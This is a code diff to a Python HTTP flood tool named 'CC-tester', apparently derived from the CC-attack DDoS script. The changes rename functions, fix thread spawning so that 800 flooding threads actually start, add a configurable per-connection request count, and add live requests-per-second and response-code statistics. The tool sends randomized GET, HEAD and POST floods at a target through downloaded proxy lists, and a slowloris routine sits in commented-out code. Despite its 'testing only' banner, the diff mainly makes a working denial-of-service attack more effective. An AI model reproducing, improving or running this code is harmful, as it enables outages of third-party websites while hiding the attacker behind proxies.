@@ -10,26 +10,9 @@ import ssl
 import datetime
 import os
 import string
+import re
+import gzip
 
-
-
-print ('''
-	   /////    /////    /////////////
-	  CCCCC/   CCCCC/   | CC-tester |/
-	 CC/      CC/       |-----------|/
-	 CC/      CC/       |  Layer 7  |/
-	 CC/////  CC/////   | test tool |/
-	  CCCCC/   CCCCC/   |___________|/
->--------------------------------------------->
-Version 3.7.1 (2022/3/24)
-                              Coded by L330n123
-                              Modified by bloodsbro
-┌─────────────────────────────────────────────┐
-│       Tos: Do not use for bad purposes      │
-│      Use only on your sites for testing     │
-├─────────────────────────────────────────────┤
-│ Link: https://github.com/bloodsbro/CC-tester│
-└─────────────────────────────────────────────┘''')
 
 referers = [
 	"https://check-host.net/",
@@ -57,15 +40,19 @@ thread_num = 800
 data = ""
 cookies = ""
 proxy_timeout = 3
+debug = False
+ind_dict = {}
+responses = {}
 ###################################################
 Intn = random.randint
 Choice = random.choice
 ###################################################
-def build_threads(mode,thread_num,event,proxy_type,proxy_timeout):
-	func = globals()[mode]
-	th = threading.Thread(target = func,args=(event,proxy_type,proxy_timeout,))
-	th.daemon = True
-	th.start()
+def buildThreads(mode,thread_num,event,proxy_type,proxy_timeout):
+	for _ in range(thread_num):
+		func = globals()[mode]
+		th = threading.Thread(target = func,args=(event,proxy_type,proxy_timeout,))
+		th.daemon = True
+		th.start()
 
 
 def generateAcceptHeader():
@@ -105,7 +92,8 @@ def generateAcceptHeader():
 
 	return accept + lang + encoding
 
-def getuseragent():
+
+def getUserAgent():
 	platform = Choice(['Macintosh', 'Windows', 'X11'])
 	if platform == 'Macintosh':
 		os = Choice(['68K', 'PPC', 'Intel Mac OS X'])
@@ -148,8 +136,8 @@ def getuseragent():
 			token = ''
 		return 'Mozilla/5.0 (compatible; MSIE ' + version + '; ' + os + '; ' + token + 'Trident/' + engine + ')'
 
-def randomurl():
-	return ''.join(random.choices(string.ascii_uppercase + string.digits, k=Intn(32, 64)));
+def randomUrl():
+	return ''.join(random.choices(string.ascii_uppercase + string.digits, k=Intn(32, 64)))
 
 def GenReqHeader(method):
 	global data
@@ -159,7 +147,7 @@ def GenReqHeader(method):
 	header = ""
 	sec = ""
 
-	useragent = "User-Agent: " + getuseragent() + ""
+	useragent = "User-Agent: " + getUserAgent() + ""
 	if os == "Windows NT 10.0; Win64; x64":
 		sec = ""
 		sec += "sec-ch-ua-mobile: ?0\r\n"
@@ -172,7 +160,7 @@ def GenReqHeader(method):
 
 	if Intn(1, 2) == 1:
 		rv = Intn(100, 106)
-		useragent += "; rv:" + rv + ".0"
+		useragent += "; rv:" + str(rv) + ".0"
 	useragent += "\r\n"
 
 	accept = generateAcceptHeader()
@@ -240,6 +228,7 @@ def InputOption(question,options,default):
 	return ans
 
 def cc(event,proxy_type,proxy_timeout):
+	global ind_dict
 	header = GenReqHeader("get")
 	proxy = Choice(proxies).strip().split(":")
 	add = "?"
@@ -263,23 +252,56 @@ def cc(event,proxy_type,proxy_timeout):
 				ctx = ssl.SSLContext()
 				s = ctx.wrap_socket(s,server_hostname=target)
 			try:
-				for _ in range(100):
-					get_host = "GET " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
+				for _ in range(multiple):
+					get_host = "GET " + path + add + randomUrl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
 					request = get_host + header
 					sent = s.send(str.encode(request))
 					if not sent:
 						proxy = Choice(proxies).strip().split(":")
 						break
+
+					try:
+						buffer = b''
+
+						result = s.recv(10000)
+						while (len(result) > 0):
+							buffer += result
+							result = s.recv(10000)
+
+						if len(buffer) > 0:
+							decoded = buffer.decode('utf8')
+							res = re.search("HTTP/1.1 (\d{1,})", decoded)
+							code = res.group(1)
+
+							addCodeRes(code, proxy)
+					except Exception as ex:
+						addCodeRes(code, proxy)
+
 				#s.setsockopt(socket.SO_LINGER,0)
 				s.close()
 			except Exception as ex:
-				print(str(ex))
+				if debug:
+					print(str(ex))
 				s.close()
+				addCodeRes("error", proxy)
 		except Exception as ex:
-			print(str(ex))
+			if debug:
+				print(str(ex))
 			s.close()
+			addCodeRes("error", proxy)
+
+
+def addCodeRes(code, proxy):
+	if(code in responses):
+		responses[code] += 1
+	else:
+		responses[code] = 1
+
+	ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 1
+
 
 def head(event,proxy_type,proxy_timeout):
+	global ind_dict
 	header = GenReqHeader("head")
 	proxy = Choice(proxies).strip().split(":")
 	add = "?"
@@ -303,13 +325,15 @@ def head(event,proxy_type,proxy_timeout):
 				ctx = ssl.SSLContext()
 				s = ctx.wrap_socket(s,server_hostname=target)
 			try:
-				for _ in range(100):
-					head_host = "HEAD " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
+				for _ in range(multiple):
+					head_host = "HEAD " + path + add + randomUrl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
 					request = head_host + header
 					sent = s.send(str.encode(request))
 					if not sent:
 						proxy = Choice(proxies).strip().split(":")
 						break#   This part will jump to dirty fix
+
+					ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 1
 				s.close()
 			except:
 				s.close()
@@ -317,6 +341,7 @@ def head(event,proxy_type,proxy_timeout):
 			s.close()
 
 def post(event,proxy_type,proxy_timeout):
+	global ind_dict
 	request = GenReqHeader("post")
 	proxy = Choice(proxies).strip().split(":")
 	event.wait()
@@ -337,11 +362,13 @@ def post(event,proxy_type,proxy_timeout):
 				ctx = ssl.SSLContext()
 				s = ctx.wrap_socket(s,server_hostname=target)
 			try:
-				for _ in range(100):
+				for _ in range(multiple):
 					sent = s.send(str.encode(request))
 					if not sent:
 						proxy = Choice(proxies).strip().split(":")
 						break
+
+					ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 1
 				s.close()
 			except:
 				s.close()
@@ -366,7 +393,7 @@ if proxy_type == "http":
 				ctx = ssl.SSLContext()
 				s = ctx.wrap_socket(s,server_hostname=target)
 			s.send("GET /?{} HTTP/1.1\r\n".format(Intn(0, 2000)).encode("utf-8"))# Slowloris format header
-			s.send("User-Agent: {}\r\n".format(getuseragent()).encode("utf-8"))
+			s.send("User-Agent: {}\r\n".format(getUserAgent()).encode("utf-8"))
 			s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
 			if cookies != "":
 				s.send(("Cookies: "+str(cookies)+"\r\n").encode("utf-8"))
@@ -408,9 +435,13 @@ def slow(conn,proxy_type):
 '''
 
 nums = 0
+valid = 0
+
 def checking(lines,proxy_type,ms,rlock,):
 	global nums
 	global proxies
+	global valid
+
 	proxy = lines.strip().split(":")
 	if len(proxy) != 2:
 		rlock.acquire()
@@ -432,23 +463,27 @@ def checking(lines,proxy_type,ms,rlock,):
 				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
 			if proxy_type == "http":
 				s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
+
 			s.settimeout(ms)
-			s.connect(("1.1.1.1", 80))
-			'''
-			if protocol == "https":
-				ctx = ssl.SSLContext()
-				s = ctx.wrap_socket(s,server_hostname=target)'''
+			s.connect(("1.1.1.1", 443))
+
+			ctx = ssl.SSLContext()
+			s = ctx.wrap_socket(s,server_hostname=target)
+
 			sent = s.send(str.encode("GET / HTTP/1.1\r\n\r\n"))
 			if not sent:
 				err += 1
 			s.close()
+			valid += 1
 			break
 		except:
 			err +=1
 	nums += 1
 
-def check_socks(ms):
+def checkSocks(ms):
 	global nums
+	global valid
+
 	thread_list=[]
 	rlock = threading.RLock()
 	for lines in list(proxies):
@@ -457,11 +492,11 @@ def check_socks(ms):
 
 		thread_list.append(th)
 		time.sleep(0.01)
-		sys.stdout.write("> Checked "+str(nums)+" proxies\r")
+		sys.stdout.write("> Checked "+str(nums)+" proxies, valid: " + str(valid) + "\r")
 		sys.stdout.flush()
 	for th in list(thread_list):
 		th.join()
-		sys.stdout.write("> Checked "+str(nums)+" proxies\r")
+		sys.stdout.write("> Checked "+str(nums)+" proxies, valid: " + str(valid) + "\r")
 		sys.stdout.flush()
 	print("\r\n> Checked all proxies, Total Worked:"+str(len(proxies)))
 	#ans = input("> Do u want to save them in a file? (y/n, default=y)")
@@ -472,8 +507,7 @@ def check_socks(ms):
 		fp.close()
 	print("> They are saved in "+out_file)
 
-def check_list(socks_file):
-	print("> Checking list")
+def checkList(socks_file):
 	temp = open(socks_file).readlines()
 	temp_list = []
 	for i in temp:
@@ -582,7 +616,7 @@ def DownloadProxies(proxy_type):
 		f.close()
 	print("> Have already downloaded proxies list as "+out_file)
 
-def PrintHelp():
+def printHelp():
 	print('''===============  CC-tester help list  ===============
    -h/help   | showing this message
    -url      | set target url
@@ -599,7 +633,27 @@ def PrintHelp():
    -p		 | set proxy timeout in seconds (default 3)
    -down     | download proxies
    -check    | check proxies
+   -debug	 | debug mode
 =====================================================''')
+
+
+def setupIndDict():
+	global ind_dict
+	for proxy in proxies:
+		ind_dict[proxy.strip()] = 0
+
+
+def printStat():
+	while True:
+		total = 0
+		for k,v in ind_dict.items():
+			total += v
+			ind_dict[k] = 0
+
+		sys.stdout.write("> CC tester | Total Rps: " + str(total) + " - responses: " + str(responses) + "\r")
+		sys.stdout.flush()
+
+		time.sleep(1)
 
 
 def main():
@@ -614,13 +668,34 @@ def main():
 	global target
 	global proxies
 	global proxy_timeout
+	global debug
+	global multiple
+
+	print('''
+    	   /////    /////    /////////////
+    	  CCCCC/   CCCCC/   | CC-tester |/
+    	 CC/      CC/       |-----------|/
+    	 CC/      CC/       |  Layer 7  |/
+    	 CC/////  CC/////   | test tool |/
+    	  CCCCC/   CCCCC/   |___________|/
+    >--------------------------------------------->
+    Version 3.7.1 (2022/3/24)
+                                  Coded by L330n123
+                                  Modified by bloodsbro
+    ┌─────────────────────────────────────────────┐
+    │       Tos: Do not use for bad purposes      │
+    │      Use only on your sites for testing     │
+    ├─────────────────────────────────────────────┤
+    │ Link: https://github.com/bloodsbro/CC-tester│
+    └─────────────────────────────────────────────┘''')
 
 	target = ""
 	check_proxies = False
 	download_socks = False
 	period = 0
 	help = False
-	print("> Mode: [cc/post/head]")#slow]")
+	multiple = 100
+
 	for n,args in enumerate(sys.argv):
 		if args == "-help" or args =="-h":
 			help =True
@@ -673,6 +748,10 @@ def main():
 			except:
 				print("> -s must be integer")
 				return
+		if args == '-debug':
+			debug = True
+
+	print("> Mode: " + mode)
 
 	if download_socks:
 		DownloadProxies(proxy_type)
@@ -680,20 +759,23 @@ def main():
 	if os.path.exists(out_file)!=True:
 		print("Proxies file not found")
 		return
+
+	checkList(out_file)
 	proxies = open(out_file).readlines()
-	check_list(out_file)
+
+	print("> Number of proxies: %d" %(len(proxies)))
+	if check_proxies:
+		checkSocks(proxy_timeout)
+		print("> Number of valid proxies: %d" %(len(proxies)))
+
 	proxies = open(out_file).readlines()
-	if len(proxies) == 0:
+
+	if len(proxies) <= 0:
 		print("> There are no more proxies. Please download a new proxies list.")
 		return
-	print ("> Number Of Proxies: %d" %(len(proxies)))
-	if check_proxies:
-		check_socks(proxy_timeout)
-
-	proxies = open(out_file).readlines()
 
 	if help:
-		PrintHelp()
+		printHelp()
 
 	if target == "":
 		print("> There is no target. End of process ")
@@ -706,11 +788,14 @@ def main():
 	else:'''
 	event = threading.Event()
 	print("> Building threads...")
-	build_threads(mode,thread_num,event,proxy_type,proxy_timeout)
+	setupIndDict()
+	buildThreads(mode,thread_num,event,proxy_type,proxy_timeout)
 	event.clear()
 	#input("Press Enter to continue.")
 	event.set()
 	print("> Flooding...")
+
+	threading.Thread(target=printStat,args=(),daemon=True).start()
 
 	if period > 0:
 		time.sleep(period)
